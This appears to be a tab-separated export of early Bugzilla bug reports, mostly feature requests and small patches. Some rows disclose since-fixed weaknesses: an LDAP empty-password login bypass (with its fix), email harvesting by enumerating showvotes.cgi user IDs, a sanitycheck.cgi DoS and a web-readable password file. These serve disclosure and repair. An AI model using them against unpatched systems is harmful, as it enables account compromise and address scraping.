51186%TAB%967890777%TAB%12919%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Changes needed in editing users if using LDAP%TAB%Changes needed in editing users if using LDAPThere are a couple of changes needed when editing users if we are using LDAP for  authentication:  1) We can't create new LDAP accounts directly from Bugzilla, so we don't want to  show or allow the "Add new user" option in editusers.cgi, nor do we want to  allow anyone to use createaccount.cgi.  2) We don't have access to the LDAP password either, so the password section of  editusers.cgi should instead display a message explaining why it's not there.
51270%TAB%968021336%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Param for contents of BODY tag so you can change background%TAB%Param for contents of BODY tag so you can change backgroundI'm attaching a patch that adds a param called 'bodyhtml' that contains the  parameters to the BODY tag in PutHeader.  The default content of this param is  the same as the text I removed from CGI.pl to replace with the param  substitution.  The reason for doing this is to allow a site to customize their link colors and  page background without having to edit CGI.pl to do it.
51299%TAB%968058209%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%RemoveVotes email should use the 'sendmailnow' Param%TAB%RemoveVotes email should use the 'sendmailnow' ParamThe RemoveVotes routine in globals.pl sends email immediately, waiting for  sendmail to return before continuing.  Since this could potentially be sending a  lot of email at once, this could slow things down to have to wait for it.  It  should follow the 'sendmailnow' Param in order to queue the mail instead of  sending it if you have that option turned off.
51300%TAB%968058804%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Email,Bug Import/Export & Moving%TAB%importxml.pl, move.pl send mail using -ODeliveryMode=background%TAB%importxml.pl, move.pl send mail using -ODeliveryMode=backgroundI remember reading somewhere else that the mozilla.org folks thought it was a  Bad Thing to do background emailing...  In both importxml.pl and move.pl (the bug move code) calls to sendmail are being  made with -ODeliveryMode=background.  Should this be changed to use the new  'sendmailnow' param?  Or should it just send the mail directly?
51487%TAB%968197093%TAB%19460%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Cannot add components after upgrading%TAB%Cannot add components after upgradinghi   I was using Bugzilla 2.8 until yesterday. I was the administrator and was able  to add components to a product.   Today I upgraded to 2.11, executed checksetup.pl which did not report any  errors.   But now I am not able to add any components. It keeps complaining:  Adding new component of mail      The name is not a valid username. Either you misspelled it, or the person has  not registered for a Bugzilla account.  Please hit the Back button and try again  -------  I used bg.mahesh@team.indiainfo.com as the "Initial Owner's name" which is my  loginname, but it doesn't work. It was working until I upgraded.  Any help is appreciated   BG Mahesh   thanks  BG Mahesh
51508%TAB%968214342%TAB%18766%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Unclosed <NOBR> around named queries in command menu%TAB%Unclosed <NOBR> around named queries in command menuSpotted with "ANT Fresco" web browser because it didn't like the mis-nesting of tags and didn't show the named queries as links.  Will attach a patch to fix the problem.
51519%TAB%968222390%TAB%18766%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Links to index aren't very generic%TAB%Links to index aren't very genericeditusers.cgi and editgroups.cgi use a link to "index.html" to link back to the main index page, however, in our Bugzilla installation we've replaced index.html with index.cgi to allow the command menu to appear if your cookies are set.  Apache then uses this for %url_base%.  This can be fixed by linking to "./" instead, I'll attach a patch which does just that.
51520%TAB%968223052%TAB%18766%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Missing uses of Param('emailsuffix')%TAB%Missing uses of Param('emailsuffix')Bugzilla had a few places where it should've used Param('emailsuffix').  We use email suffices in our Bugzilla installation so I spotted the problem.  I'll attach a patch to fix these problems.
51521%TAB%968224471%TAB%18766%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%Broken HTML on user permissions page%TAB%Broken HTML on user permissions pageThe user permissions page generates broken HTML, namely a table with no rows or cells.    I'll attach a patch to fix it.
51670%TAB%968272890%TAB%15223%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Dependency loops are possible.,Can make a bug depend on itself,Dependency loops are possible%TAB%Dependency loops are possible.,Can make a bug depend on itself,Dependency loops are possibleSteps to reproduce: Create a bug. Mark it as both blocking and blocked by some bug.
52060%TAB%968581309%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%File attachment comments don't wrap in body.%TAB%File attachment comments don't wrap in body.Attach a file w/ a very long summary.  result: 2 lines. One very long.  prefered outcome: Created an attachment line, and attachment comments as one  paragraph.
52228%TAB%968701808%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bug list title should be name of query if running named query%TAB%Bug list title should be name of query if running named queryAttaching a patch that will name the window according to the name of the query  you are running if you run a named query.
52577%TAB%968868793%TAB%11626%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Mac OS X needs an OS entry in bugzilla%TAB%Mac OS X needs an OS entry in bugzillahe Mac OS X beta is out.  We need a bugzilla entry for it.
52782%TAB%968991657%TAB%19069%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%whineatnews.pl email should use the 'sendmailnow' Param (FIX INCLUDED :-)%TAB%whineatnews.pl email should use the 'sendmailnow' Param (FIX INCLUDED :-)Related/same as bugs 50159, 51299, 51300.  The 'whineatnews.pl' Perl script should also use the new 'sendmailnow' Param. Here's a fix a la the rest (+ = added code), bottom of file 'whineatnews.pl', line #65:  +   my $sendmailparam = "-ODeliveryMode=deferred"; +   if (Param("sendmailnow")) { +      $sendmailparam = ""; +   } +   open(SENDMAIL, "|/usr/lib/sendmail $sendmailparam -t") ||     print SENDMAIL $msg;     close SENDMAIL;  Bye-bye, Eric Maryniak
52885%TAB%969038252%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%automatic radio selection for reassign shouldn't trigger if new text is same as original owner or empty%TAB%automatic radio selection for reassign shouldn't trigger if new text is same as original owner or emptySteps to reproduce: 0. have javascript turned on 1. go to an open bug 2. change e-mail address in 'assignee' box just above 'commit' 3. notice that js automatically selects the 'reassign' box for you (good) 4. change your mind, and select "resolve bug" instead 5. clear e-mail address for 'reassign', or change back to original owner,  because you're worried that you might change something accidentally. 6. notice that js automatically selects the 'reassign' box for you (bad)  This is somewhere between minor and enhancement and "future me!!!".
52921%TAB%969085453%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl fails to create database with password%TAB%checksetup.pl fails to create database with passwordAs pointed out in bug 16454, the patch that was checked in as a result of that  bug allowed you to update an existing bugzilla configuration if the database was  password-protected.  However, it still did not allow you to *create* a database  on such a system for the initial setup.  That bug was marked fixed, and a comment  said a new bug report should be opened for the problem with creating a database.   I haven't seen one yet, so this is it.  I have a new patch I'll be posting shortly that fixes this. :)  The trick was just to remove the database name from the connect string.  It was  trying to log into the database server and select that database in one fell  swoop, but that was a bad thing because we didn't know the database exists yet at  that point.  Now it logs into the server but doesn't select a database (which is  good because we're logging in at this point in order to see what databases are  there - we don't even know what's there yet).  While I was messing with it, I also discovered that checksetup.pl got missed when  we did the 5.6 compatibility update on globals.pl, so that is also included in  this patch.
53180%TAB%969343884%TAB%15984%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Target Milestone dropdown elements appears twice%TAB%Target Milestone dropdown elements appears twiceOpen any bug and look at the Target Milestone dropdown menu. All elements appear twice in the list  I'm on Nt 4 Sp6a and I tried on IE5.5, Netscape 4.75 and Mozilla : every time the same result. But at the time of writing, it seems that it is fixed.
53452%TAB%969461271%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%[RFE] Mid-air collision: let me copy my comment out of a textarea,Mid-air collision: let me copy my comment out of a textarea,Mid-air collision: allow copy-paste of the comment from a textarea%TAB%[RFE] Mid-air collision: let me copy my comment out of a textarea,Mid-air collision: let me copy my comment out of a textarea,Mid-air collision: allow copy-paste of the comment from a textareaI've had to view-source the mid-air collision page and then manually unescape  my comments several times.  It would be much easier to recover from collisions  if there was a textarea on the collision page contianing the new comment.  This assumes that people spend more time writing comments than tweaking  summaries, or at least that it's easier to re-tweak a summary than it is to  rewrite a comment.  Related: bug 31117, ignore collisions when the second person is just adding  comments.  (I disagree with this bug because it would make bug discussion less  continuous.)  And with trying to submit a new bug without a component.    I think I've lost about a hundred lines of bug comments from bugzilla rejecting  other changes and incorrectly assuming that my browser will let me see my  comments again when I hit Back.  It gets annoying pretty quickly.
53612%TAB%969536419%TAB%17009%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%"milestone url" is bad on delete componant screen,"milestone url" is bad on delete component screen%TAB%"milestone url" is bad on delete componant screen,"milestone url" is bad on delete component screenI have Bugzilla 2.10 running on a rh60 system.  When I go to the components menu, and pick a product/component, then click "Delete" for that component, I get values for all the Parts except for "Milestone URL."  What shows up is a hyperlink text  -- missing">missing, with a link to <FONT COLOR=    It looks like it would be fine if only "milestoneurl" had another value, but it probably shouldn't break like this if it doesn't.
53696%TAB%969581038%TAB%12846%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,attachment and request management%TAB%Attachments of mime type containing a . are rejected%TAB%Attachments of mime type containing a . are rejectedWhen creating an attachment of mime type 'vnd.ms-excel' bugzilla replies : You must select a legal mime type, vnd.ms-excel just will not do.  As already pointed out on the newsgroup, the problem is caused by the line      if ($mimetype !~ m@^(\w|-)+/(\w|-)+$@) in createatatchment.cgi  It should be something like  if ($mimetype !~ m@^(\w|-|\.)+/(\w|-|\.)+$@)  See also news://news.mozilla.org/39A4019C.FBCBB851%40zeroknowledge.com
53911%TAB%969714539%TAB%19460%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Installation,Administration%TAB%Can't locate Mozilla/LDAP/Conn.pm%TAB%Can't locate Mozilla/LDAP/Conn.pmThe real problem here is that someone threw an evil eval block in CGI.pl, around line 33:  eval 'use Mozilla::LDAP::Conn'; my $have_ldap = $@ ? 0 : 1;  This is bad because it's not a silent test.  If you don't have the LDAP package, just comment out the two above lines and add a line below  my $have_ldap = 0;  And shame the authors for not testing their code ;-)
53951%TAB%969764016%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[rfe] make bug# link on show_bug.cgi an absolute link%TAB%[rfe] make bug# link on show_bug.cgi an absolute linkThe bug# link on show_bug.cgi should be an absolute link so that users can use  the link after saving a copy of the page.  This will be a piece of cake to implement and will be a useful feature.  Just change "<A HREF=\"show_bug.cgi?id=$bug_id\">" to "<A HREF=\"" . Param('urlbase') . "show_bug.cgi?id=$bug_id\">"
54159%TAB%969935229%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email,Bugzilla-General%TAB%Real easy way to farm email addresses out of Bugzilla.%TAB%Real easy way to farm email addresses out of Bugzilla.Simply write a script to get each of "http://bugzilla.mozilla.org/showvotes.cgi?user=XXX" where XXX is 1 upwards.  I'd prefer it if you couldn't see the votes of other people at all, but if it stays the same way, I'm not sure what we should do here.  Assignees and QA of bugs should be able to see who votes for a bug.  If I own a bug, I want to be able to ask someone why they voted for it. Similarly, depending on how a bug is arranged there are times when I (the QA  contact) would need the ability to interview people.  Yes it's true anyone could take QA contact, but if they do it for too many bugs  we'll suspend their account, like we have for other things.
54556%TAB%970144521%TAB%13283%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%sanitycheck.cgi can be run by unprivileged accounts%TAB%sanitycheck.cgi can be run by unprivileged accountshttp://bugzilla.mozilla.org/sanitycheck.cgi can be run from an ordinary bugzilla account (e.g. mine).  On a bugs database as large as bugzilla.mozilla.org, that effectively counts as a DoS if done repeatedly.
54566%TAB%970145244%TAB%13283%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Software error generated when adding invalid dependencies%TAB%Software error generated when adding invalid dependenciesIf you try to make a bug depend on or block an invalid bug id, bugzilla correctly reports in big bad red and black that the bug id you entered was invalid.  However, it then generates a software error.  I changed the die() to a confess() and got this stack trace:  SELECT profiles.userid, profiles.groupset, profiles.login_name, profiles.login_name = 'aspiers@guideguide.com' AND profiles.cryptpassword = logincookies.cryptpassword AND logincookies.hostname = '192.168.1.1', profiles.disabledtext  FROM profiles, logincookies WHERE logincookies.cookie = '310' AND profiles.userid = logincookies.userid: Table 'logincookies' was not locked with LOCK TABLES at globals.pl line 140         main::SendSQL('SELECT profiles.userid, profiles.groupset, profiles.login_name, ...') called at CGI.pl line 538         main::quietly_check_login() called at CGI.pl line 909         main::GetCommandMenu() called at globals.pl line 944         main::Param('commandmenu') called at globals.pl line 977         main::PerformSubsts('&lt;TABLE BORDER=&quot;0&quot;&gt;&lt;TR&gt;&lt;TD BGCOLOR=&quot;#000000&quot; VALIGN=&quot;TOP&quot;&gt;^J&lt;TABLE...') called at CGI.pl line 812         main::PutFooter() called at CGI.pl line 821         main::PuntTryAgain('12345 is not a legal bug number') called at /nfs-home/stuff/web/bugzilla/process_bug.cgi line 727  Why MySQL was expecting logincookies to be locked, I have no idea ...
54901%TAB%970471344%TAB%20199%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%LDAP Authentication should fail for empty passwords,[security] LDAP Authentication should fail for empty passwords%TAB%LDAP Authentication should fail for empty passwords,[security] LDAP Authentication should fail for empty passwordsWhen using LDAP and no password is specified in the login screen, the bind is successful even if the user has a password.  This is because and LDAP bind with no password (regardless of the bindn value) will be treated as an anonymous bind.  The Netscape SDK documentation at <http://docs.iplanet.com/docs/manuals/dirsdk/csdk30/writing.htm>, states      Note that if you specify a DN but no password, your client will     bind to the server anonymously. If you want a NULL password to     be rejected as an incorrect password, you need to write code to     perform the check before you call the ldap_simple_bind() or    ldap_simple_bind_s() function.  The following diff shows such a change to CGI.pl:  =================================================================== RCS file: /cvsroot/mozilla/webtools/bugzilla/CGI.pl,v retrieving revision 1.73 diff -u -r1.73 CGI.pl --- CGI.pl      2000/09/18 21:29:44     1.73 +++ CGI.pl      2000/10/02 16:18:27 @@ -719,6 +719,21 @@           exit;         }   +       # if no password was provided, then fail the authentication +       # while it may be valid to not have an LDAP password, when you +       # bind without a password (regardless of the binddn value), you +       # will get an anonymous bind.  I do not know of a way to determine +       # whether a bind is anonymous or not without making changes to the +       # LDAP access control settings +       if ( ! $::FORM{"LDAP_password"} ) { +         print "Content-type: text/html\n\n"; +         PutHeader("Login Failed"); +        print "You did not provide a password.\n"; +         print "Please click <b>Back</b> and try again.\n"; +         PutFooter(); +         exit; +       } +         # We've got our anonymous bind;  let's look up this user.         my $dnEntry = $LDAPconn->search(Param("LDAPBaseDN"),"subtree","uid=".$::FORM{"LDAP_login"});         if(!$dnEntry) {
55161%TAB%970626679%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Show Activity: Old/New Values don't display full data%TAB%Show Activity: Old/New Values don't display full datathe problem is that the logging field is too narrow, and that we treat the  real field as a string for diffing instead of a list.  all changed output [both email and log] should be of the form: cc -userlist         | +userlist    ^people removed   | ^people added or something similar
55429%TAB%970758524%TAB%10163%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%multiple votes not allowed%TAB%multiple votes not allowedThe help page states that multiple votes per bug is allowed (since you only have a finite number of votes this is OK). However, if you try to allocate more than one vote to a bug, you get an error messgage.  To reproduce: try to allocate more than 1 vote to a bug :-)  Yes, that's to be expected, I just didn't know PSM allowed votes.  The reason is that these products that these allow an UNCONFIRMED status.  UNCONFIRMED will automatically turn into NEW once it has a certain number of votes (about 3 I think).  Therefore, someone could assign of all their votes to a bug to confirm it and then remove them.  The intention was that 3 different people should have to assign their votes.  Removing multiple voting was a kludgy workaround to ensure this.  Better would be if it checked the number of voters was >= 3.  Even better if there was a confirmation points system separate from the voting system.  In any case however, I do think whether to allow multiple votes should be an admin choice.  An admin choice I think should be on for all products in b.m.o I might add.
55436%TAB%970762065%TAB%9186%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Link to "show all dups" on bug page,Need an easy way to find bugs that are marked as duplicates of the one you're viewing,Implement list of duplicate bug numbers on show_bug.cgi (easy way to find duplicates of the bug you're viewing),Implement list of duplicate bug numbers on show_bug.cgi (easy way to find dupes of the bug you're viewing)%TAB%Link to "show all dups" on bug page,Need an easy way to find bugs that are marked as duplicates of the one you're viewing,Implement list of duplicate bug numbers on show_bug.cgi (easy way to find duplicates of the bug you're viewing),Implement list of duplicate bug numbers on show_bug.cgi (easy way to find dupes of the bug you're viewing)It would be great if show_bug.cgi could provide a link to easily find all bugs  currenly marked as dups of the bug. This would be great when verifying bugs to  make sure that all testcases in all dups works. It would also be good to go  though all dups to make sure that they actually are dups.  I know that this infromation can be got useing a bugzilla query, but I still  think it would be a good way to increase quality of verifications. (The link on  the page could be just a link to a bugzilla query)
55630%TAB%970881247%TAB%20391%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Email%TAB%email-suffix is not shown in createaccount-page%TAB%email-suffix is not shown in createaccount-pageif an email-suffix is configured, it should be shown in the createaccount page. (patch follows)
55753%TAB%971011938%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%if order is the first param to buglist.cgi, can't resort%TAB%if order is the first param to buglist.cgi, can't resortSteps to reproduce: 1. go to url above (http://bugzilla.mozilla.org/buglist.cgi? order=bugs.bug_id&short_desc_type=substring&short_desc=new%20window) 2. try to resort by clicking on one of the column headers  Result: end up at http://bugzilla.mozilla.org/buglist.cgi? order=bugs.bug_id&short_desc_type=substring&short_desc=new% 20window&order=bugs.resolution%2C%20bugs.bug_id   (notice that the order at the beginning hasn't been removed)   this creates an sql error when it tries to ORDER BY bugs.bug_idbugs.resolution, bugs.bug_id
56822%TAB%971685675%TAB%20759%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%patch to sanitycheck to test initialowner%TAB%patch to sanitycheck to test initialownerHello,  since the initialowner needs to be specified by name and is not stored by id i  added a check for it to the checksanity.pl script.  --- sanitycheck.cgi~    Mon Oct 16 19:31:55 2000 +++ sanitycheck.cgi     Mon Oct 16 19:34:03 2000 @@ -136,8 +136,10 @@             ["cc", "who"],             ["votes", "who"],             ["longdescs", "who"],             ["namedqueries", "userid"]); + +CrossCheck("profiles", "login_name", +          ["components", "initialowner"]);   of course it would be better to use userid and a drop down field.  Greetings Bernd
57161%TAB%971861043%TAB%12908%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%file can contain a password, shouldn't be readable%TAB%file can contain a password, shouldn't be readableThis file contains the password for the bugs user in the database if there is one. It shouldn't be possible to display this file using an URL.  The documentation should really mention that one should create a .htaccess file saying that this file should not be displayed.
57350%TAB%971967371%TAB%8593%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General,Query/Bug List%TAB%bugzilla is too slow,"added comment" search is slow,"added comment" search is slow or doesn't work at all,multiple role email search is slow or doesn't work at all,"added comments" search is slow or doesn't work at all%TAB%bugzilla is too slow,"added comment" search is slow,"added comment" search is slow or doesn't work at all,multiple role email search is slow or doesn't work at all,"added comments" search is slow or doesn't work at allWhen I try to lookup all bugs I've ever touched (go to the query page, select everything in the first field (the one that starts with three lines already selected), go to the second email entry field, enter 'cesarb@dcc.ufrj.br', and mark every checkbox, select 'Importance' ordering, and submit), it hangs for too long (and Mozilla timeouts). This is an old bug (since about two milestones ago or more); sorry for waiting instead of reporting...  I'm using 2000101908Mtrunk.
57817%TAB%972373947%TAB%18216%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Internet Explorer gets the refresh thing wrong.%TAB%Internet Explorer gets the refresh thing wrong.The patch at the URL will add some more info to the headers to make the refresh  thing work in IE as well. It looks like this has been fixed in almost all places  but these two.  This is against todays bugzilla.
57819%TAB%972374484%TAB%18216%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%cut down large mysql error strings%TAB%cut down large mysql error stringsIf msql reports a problem, the resulting strings can be large. Example,  submitting a 10Mb file as an attachment (which fails) shows up with a missing quote error. This takes aaaaaages to download.  Patch attached. Against todays bugzilla.  The patch takes out the middle bit and leaves the beginning and end of the  error message in tact.
57821%TAB%972374735%TAB%18216%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Empty regular expression match nothing%TAB%Empty regular expression match nothingEmpty regular expressions do not match anything when searching for users.  Patch against todays bugzilla at URL.  Actually, it's worse than not matching anything, it does this:  Software error:  SELECT login_name,realname,disabledtext FROM profiles WHERE login_name regexp''  ORDER BY login_name: Got error 'empty (sub)expression' from regexp at globals.pl line 195. 
57842%TAB%972382530%TAB%18216%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%make enter_bug.cgi list the programs next to the modules.,On enter_bug.cgi, show component description when it is selected%TAB%make enter_bug.cgi list the programs next to the modules.,On enter_bug.cgi, show component description when it is selectedWhen selecting a module to report a bug for, it is convenient to be able to  select the program as well.  This incurs an extra database query though. Maybe it should be an option.  Patch against today's bugzilla in URL.
57890%TAB%972397808%TAB%3845%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%database corruption problem submitting report with Bugzilla Helper%TAB%database corruption problem submitting report with Bugzilla HelperNick Hart of Real is having trouble with Bugzilla Helper:  I am unable to submit a bug report.  I don't know what is wrong, but I keep getting the message:  "Possible bug database corruption has been detected. Please send mail to dmose@mozilla.org with details of what you were doing when this message appeared. Thank you. src = All Windows 3.1 Windows 95 Windows 98 Windows ME Windows 2000 Windows NT Mac System 7 Mac System 7.5 Mac System 7.6.1 Mac System 8.0 Mac System 8.5 Mac System 8.6 Mac System 9.x MacOS X Linux BSDI FreeBSD NetBSD OpenBSD AIX BeOS HP-UX IRIX Neutrino OpenVMS OS/2 OSF/1 Solaris SunOS other default = Mac System 9.0"  ---- later he adds ... ----  Ok, I managed to get it posted: 57885  I think there is a problem with the page at: http://www.mozilla.org/quality/help/bugzilla-helper.html  I was unable to submit a bug using it.  However, if I went directly to the CGI bug submission form I was able to submit it.  -----  Nick, could you please provide your platform info and steps to reproduce? Thanks!
58179%TAB%972592943%TAB%18499%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration,Query/Bug List%TAB%End date not included in queries%TAB%End date not included in queriesWhen querying for bugs across a range of dates the last date is not included in  the results.  This is probably not what the user would expect.
58242%TAB%972643967%TAB%21176%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Accounts%TAB%Suggested change for relogin.cgi,relogin.cgi fails to delete server's copy of the cookie%TAB%Suggested change for relogin.cgi,relogin.cgi fails to delete server's copy of the cookieI found it odd that relogin.cgi didn't clear out someone's entry(ies) from the "logincookies" table after it logged them out, relying instead on "confirm_login()" to clear them after they get 30 days old.  A table can fill up fast that way.  I've solved this by adding these two lines to relogin.cgi just after the line that says 'require "CGI.pl";':  ConnectToDatabase(); SendSQL("delete from logincookies where userid=" . DBname_to_id(url_decode($::COOKIE{"Bugzilla_login"})));  (The url_decode is in there because I found I sometimes had "%40" instead of "@" in the Bugzilla_login cookie and thus it wouldn't recognize the login...)  Just wanted to share :)
58436%TAB%972864967%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Lots of strict warnings in query.cgi,javascript strict warnings in query.cgi%TAB%Lots of strict warnings in query.cgi,javascript strict warnings in query.cgiThe javascript output from query.cgi has a lot of javascript script warnings.  Some of them: JavaScript strict warning: http://bugzilla.mozilla.org/query.cgi line 783: reference to undefined property vsel[v]  JavaScript strict warning: http://bugzilla.mozilla.org/query.cgi line 817: reference to undefined property tmsel[tm]  Expected: No javascript strict warnings...
58731%TAB%973057007%TAB%21302%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Can't use regexp for keywords on "boolean chart","Keywords" "contains regexp" Boolean Chart does not work%TAB%Can't use regexp for keywords on "boolean chart","Keywords" "contains regexp" Boolean Chart does not workIf I create a query on the boolean chart area of the query form including:  [Keywords]  [contains regexp] OR [Keywords]  [does not contain regexp]  and enter a regexp, (e.g. ".*" for a test)  The web form comes back with the error: "Unknown keyword named .*"  ISTM that it should search the keywords table for all keywords containing the  given regexp, and find all bugs [not] containing those keywords. This would  allow related keywords with a similar base to be defined and searched for on  this or other bugzilla installations.  E.g. looking at the main mozilla.org bugzilla keywords list, "KB.*", "ja.*"  might be useful...
58994%TAB%973213746%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,User Interface%TAB%Edit Prefs>Email Settings>Users to watch: needs an upgrade%TAB%Edit Prefs>Email Settings>Users to watch: needs an upgradeWe converted bugzilla's bug CC system from a single line into an editbox for  adding users, and a listbox for removing/viewing them.  Please copy this feature to the users to watch section.
59193%TAB%973425586%TAB%11608%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%can't go back after visiting bug-form.html%TAB%can't go back after visiting bug-form.htmlbug-form.html uses document.location = "./bugzilla-helper.html" to redirect, so  if I hit back after going through bug-form.html, I end up back at bugzilla- helper.html.  document.location.replace("./bugzilla-helper.html") would be  friendlier to history.
59349%TAB%973562902%TAB%21375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%processmail bails out when running in secure (taint) mode%TAB%processmail bails out when running in secure (taint) modeWhen processmail is run using perl -T, as all web applications should, it bails  out since subroutine NewProcessOneBug creates files using the bug number that was passed as an argument to the program. The attached patch verifies the correctness of the bug number (i.e., a decimal number) and untaints it if okay.
59351%TAB%973564743%TAB%21375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Email%TAB%What if I'm not using sendmail,Move calls to sendmail to a central place (globals.pl),Move calls to sendmail to a central place%TAB%What if I'm not using sendmail,Move calls to sendmail to a central place (globals.pl),Move calls to sendmail to a central placeCurrently, the facilities to send email messages are hardwired to the sendmail program, and distributed through the sources. The attached patch:   - moves all sendmail handling code to globals.pl, routine MailMessage.   - additionally, this routine is prepared to use PostFix instead of sendmail.   - replaces all calls to sendmail to use the new routine.  As a result, changes to the MTA, for example to use PostFix instead of sendmail, are now easy to apply, in just one central location.  Remark1: Some parts of the old code did not check for sendmail errors. The patch keeps this 'feature'? intact. Remark2: A BugZilla config param could be added to select PostFix instead of sendmail.
59352%TAB%973566183%TAB%21375%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Remove sillyness,Remove sillyness from globals.pl,Remove "used only once fix" silliness from globals.pl%TAB%Remove sillyness,Remove sillyness from globals.pl,Remove "used only once fix" silliness from globals.plWhen "use strict" was added to the bugzilla scripts, there were some misconceptions about the use of "use vars". Therefore, to avoid warnings, lots of sillyness was introduced.  The attached patch fixes the sillynesses for "globals.pl", being one of the two central files. Patches for the other files will follow in due time. Note that the fixes for each of the files are independent of each other.
59515%TAB%973676705%TAB%4897%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Add TITLE attribute to A HREF of bug # in description%TAB%Add TITLE attribute to A HREF of bug # in descriptionI like the way Asa has started adding the bug summary as a TITLE attribute of bugs he links to at http://www.mozillazine.org/build_comments/  This makes it very easy to simply hold the mouse over the link and get a clue about what a bug is without having to click on it and load another page.  This could also be useful for the dependency tree and even Bonsai (although I realize that's a completely different script).
59989%TAB%974118734%TAB%1537%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%use bigger MySQL caches on bugzilla.mozilla.org%TAB%use bigger MySQL caches on bugzilla.mozilla.orgThe MySQL manual has a chapter about performance, and one of the things recommended for high-volume usage is a number of specific settings (mostly related to the size of various caches) on the command line to mysqld.  These should be put in place.  The safe_mysqld start up command line now looks like this:  $bindir/safe_mysqld -l -O max_allowed_packet=1M -O max_connections=256 -O key_buffer=16M -O table_cache=128 -O sort_buffer=4M -O record_buffer=1M  The last four options are now, and should improve performance.
